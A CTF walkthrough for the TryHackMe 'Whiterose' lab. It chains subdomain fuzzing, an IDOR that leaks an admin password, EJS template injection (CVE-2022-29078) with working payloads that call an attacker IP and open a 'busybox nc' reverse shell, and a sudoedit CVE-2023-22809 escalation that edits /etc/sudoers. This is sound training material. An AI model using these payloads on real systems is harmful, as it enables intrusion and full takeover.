![Pasted image 20241030205205.png](../../IMAGES/Pasted%20image%2020241030205205.png)
# ENUMERATION


## OPEN PORTS

![Pasted image 20241031130806.png](../../IMAGES/Pasted%20image%2020241031130806.png)

Let's explore the website:

![Pasted image 20241031130903.png](../../IMAGES/Pasted%20image%2020241031130903.png)

So, we need to add `cyprusbank.thm` to `/etc/hosts`:

![Pasted image 20241031131009.png](../../IMAGES/Pasted%20image%2020241031131009.png)

Once we've done that, let's try to look at the source code and fuzz the website:

![Pasted image 20241031131106.png](../../IMAGES/Pasted%20image%2020241031131106.png)
Nothing useful, let's proceed with fuzzing

## FUZZING


![Pasted image 20241031131414.png](../../IMAGES/Pasted%20image%2020241031131414.png)
Let's fuzz for DNS, we are able to do this in the following way:

```ad-hint

#### COMMAND:

`ffuf -u 'http://cyprusbank.thm' -H "Host: FUZZ.cyprusbank.thm" -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -t 100 -ic -fw 1`

#### OUTPUT



```

We got an `admin` section, let's visit it:

![Pasted image 20241106150211.png](../../IMAGES/Pasted%20image%2020241106150211.png)


![Pasted image 20241106150225.png](../../IMAGES/Pasted%20image%2020241106150225.png)

We got credentials from earlier, let's authenticate using: 

`Olivia Cortez:olivi8`


![Pasted image 20241106150415.png](../../IMAGES/Pasted%20image%2020241106150415.png)

We got some recent payments, let's investigate the page in order to get something useful:

![Pasted image 20241106151026.png](../../IMAGES/Pasted%20image%2020241106151026.png)

Found a messages section, interesting part is the `?c=` parameter, this seems injectable for some sort of [IDOR](../../Bug%20Bounty/Vulnerabilities/SERVER%20SIDE%20VULNERABILITIES/IDOR/IDOR%20BASICS.md), let's change that `?c=` parameter into something else, for example `10`:


![Pasted image 20241106151311.png](../../IMAGES/Pasted%20image%2020241106151311.png)

Wow, seems like we got `Gayle Bev` password, and he is actually an admin user, let's log in:

`Gayle Bev: p~]P@5!6;rs558:q`


![Pasted image 20241106151509.png](../../IMAGES/Pasted%20image%2020241106151509.png)

Nice, we've logged in, let's go into settings:

![Pasted image 20241106151640.png](../../IMAGES/Pasted%20image%2020241106151640.png)

Seems like we can change users passwords , let's begin with exploitation 

# EXPLOITATION

Explanation is a bit long, but here is a little summary of it:

Testing the`name` and`password` parameters for vulnerabilities like **SQL** or **SSTI**, we do not find anything. So, let's fuzz for any other parameters the`/settings` endpoint might accept.

Using **ffuf** for this, we discover a couple of interesting parameters:

```ad-hint
`ffuf -u 'http://admin.cyprusbank.thm/settings' -X POST -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: connect.sid=s%3AMwjzKA3EcBUXIsqGNDDaHARGh5B7JYwk.jwhk7KbGBNbC46HXtU8Ln%2BqMzdigbh1ZTMDnal6RC24' -mc all -d 'name=test&password=test&FUZZ=test' -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -t 100 -fs 2098<br>`

#### OUTPUT

```
While the`error` and`message` parameters simply cause the server to include their values in the response, the`include`,`client`, and`async` parameters are more interesting.

When the`include` and`client` parameters are present, the server returns a **500** response with an error like this:

[![Web 80 Admin Settings Four](https://jaxafed.github.io/images/tryhackme_whiterose/web_80_admin_settings4.webp)](https://jaxafed.github.io/images/tryhackme_whiterose/web_80_admin_settings4.webp)

```ad-note
`TypeError: /home/web/app/views/settings.ejs:4<br> 2\| <html lang="en"><br> 3\| <head><br> >> 4\| <%- include("../components/head"); %><br> 5\| <title>Cyprus National Bank</title><br> 6\| </head><br> 7\| <body><br>
include is not a function
<br> at eval ("/home/web/app/views/settings.ejs":12:17)<br> at settings (/home/web/app/node_modules/ejs/lib/ejs.js:692:17)<br> at tryHandleCache (/home/web/app/node_modules/ejs/lib/ejs.js:272:36)<br> at View.exports.renderFile [as engine] (/home/web/app/node_modules/ejs/lib/ejs.js:489:10)<br> at View.render (/home/web/app/node_modules/express/lib/view.js:135:8)<br> at tryRender (/home/web/app/node_modules/express/lib/application.js:657:10)<br> at Function.render (/home/web/app/node_modules/express/lib/application.js:609:3)<br> at ServerResponse.render (/home/web/app/node_modules/express/lib/response.js:1039:7)<br> a/home/web/app/routes/settings.js:27:7 at runMicrotasks (<anonymous>)`
````

And when we use the`async` parameter, we simply receive`{}` in the response.

[![Web 80 Admin Settings Five](https://jaxafed.github.io/images/tryhackme_whiterose/web_80_admin_settings5.webp)](https://jaxafed.github.io/images/tryhackme_whiterose/web_80_admin_settings5.webp)

From the error, we learn that the application uses **EJS** as a template engine. If the application directly passes our request body to the`render` function as the`data` argument, this could lead to an **SSTI** vulnerability. This is because **EJS** allows certain options, such as`client` and`async`, to be included in the same argument as the data. Notably, the fact that the`client` option causes an error and using the`async` option results in the server responding with only`{}` suggests that this might be the case here.

We can try to confirm this by using the`delimiter` option, which is also one of the options allowed to be passed along with data. By default, it is set to`%`. If we change it to a string that does not exist in the template, we should be able to leak the template.

Testing our theory, we find that we are correct, as we successfully leak the template.

[![Web 80 Admin Settings Six](https://jaxafed.github.io/images/tryhackme_whiterose/web_80_admin_settings6.webp)](https://jaxafed.github.io/images/tryhackme_whiterose/web_80_admin_settings6.webp)

As I mentioned before, there are only a limited number of options allowed to be passed along with data. However, this is where the`CVE-2022-29078` vulnerability comes into play. By using the`settings['view options']` parameter, we are able to pass any option without limitation.

And there are certain options, like`outputFunctionName`, that are used by **EJS** without any filtration to build the template body, allowing us to inject code it.

You can find more information about the vulnerability and the **PoC** [here in this article](https://eslam.io/posts/ejs-server-side-template-injection-rce/).

Testing the **PoC** payload from the article, we find that it works, as we receive a request on our server.

`settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('curl 10.11.72.22');s|`

[![Web 80 Admin Settings Seven](https://jaxafed.github.io/images/tryhackme_whiterose/web_80_admin_settings7.webp)](https://jaxafed.github.io/images/tryhackme_whiterose/web_80_admin_settings7.webp)

```ad-hint
`10.10.116.77 - - [31/Oct/2024 05:03:44] 
"GET / HTTP/1.1" 200 10.10.116.77 - - [31/Oct/2024 05:03:44] "GET / HTTP/1.1" 200 
10.10.116.77 - - [31/Oct/2024 05:03:45] "GET / HTTP/1.1" 200 -|`
````

Now, we can use it to obtain a shell, first by using our web server to serve a reverse shell payload.

Create a `index.html` file with this inside:

![Pasted image 20241106160836.png](../../IMAGES/Pasted%20image%2020241106160836.png)

![Pasted image 20241106160911.png](../../IMAGES/Pasted%20image%2020241106160911.png)


![Pasted image 20241106160440.png](../../IMAGES/Pasted%20image%2020241106160440.png)

Once, I sent the request, it seemed like the web server was unable to read my index.html file, so, I changed the request to this, and got a shell:

```ad-hint

##### USED

`&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('busybox nc 10.6.34.159 4444 -e bash');s`

#### OUTPUT



```
# PRIVILEGE ESCALATION
---

First, let's [stabilize](../../Commands/Shell%20Tricks/STABLE%20SHELL.md) our shell:


![Pasted image 20241106162117.png](../../IMAGES/Pasted%20image%2020241106162117.png)

Nice, with our new stabilized shell, we can look forward to escalate our privileges into root, let's enumerate the machine:


## SUDO -L

![Pasted image 20241106162209.png](../../IMAGES/Pasted%20image%2020241106162209.png)

We can run sudo in 

`sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm

### SUDOEDIT VERSION

![Pasted image 20241106162300.png](../../IMAGES/Pasted%20image%2020241106162300.png)

For this version, we found [CVE-2023-22809](https://access.redhat.com/security/cve/cve-2023-22809), let's exploit it and escalate our privileges:

#### POC


For this, we need to do the following:

```ad-hint

# STEP BY STEP

1. export EDITOR="nano -- /etc/sudoers"
2. sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
3. web ALL=(ALL) NOPASSWD: ALL

If we did everything correctly, we are now able to run sudo as web in everything:




```

And just like that CTF is done

#### FLAGS


![Pasted image 20241106164116.png](../../IMAGES/Pasted%20image%2020241106164116.png)

Gg!
